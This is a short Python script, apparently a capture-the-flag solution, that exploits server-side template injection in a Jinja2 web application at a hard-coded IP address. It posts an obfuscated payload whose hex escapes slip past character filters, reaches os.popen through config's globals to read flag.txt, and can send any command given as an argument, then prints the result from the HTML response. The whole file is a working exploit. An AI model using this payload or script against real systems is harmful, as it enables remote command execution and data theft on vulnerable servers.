#!/bin/python3

import requests
import sys
import re
import html

url = 'http://34.118.62.248'
payload = "{.{ config|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')|attr('popen')('cat flag\\x2etxt')|attr('read')() }.}"

def run(cmd):
    r = requests.post(url, data={'name': cmd})
    m = re.search('x-large;">(.*?)</div>', r.text, re.DOTALL)
    if m:
        r = m.group(1)
    r = html.unescape(r)
    r = html.unescape(r)
    print(r)

if __name__=="__main__":
    if len(sys.argv) > 1:
        run(sys.argv[1])
        exit(0)
    run(payload)
